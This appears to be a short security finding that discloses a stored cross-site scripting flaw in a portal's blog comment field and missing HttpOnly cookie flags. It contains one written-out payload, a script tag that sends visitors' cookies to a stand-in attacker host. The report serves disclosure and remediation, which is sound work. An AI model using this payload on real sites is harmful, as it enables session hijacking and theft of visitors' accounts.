# Stored XSS in Comments

- **Severity:** High
- **Asset:** Nexus Portal
- **Date:** 2025/10/14
- **Location:** https://example.com/blog/post/42#comments
- **Status:** Open

## Description

The comment body field does not sanitise user-supplied HTML. Submitting
`<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` as a
comment results in the script executing for every visitor who views the
post.

Session cookies lack the `HttpOnly` flag, allowing full session hijack.
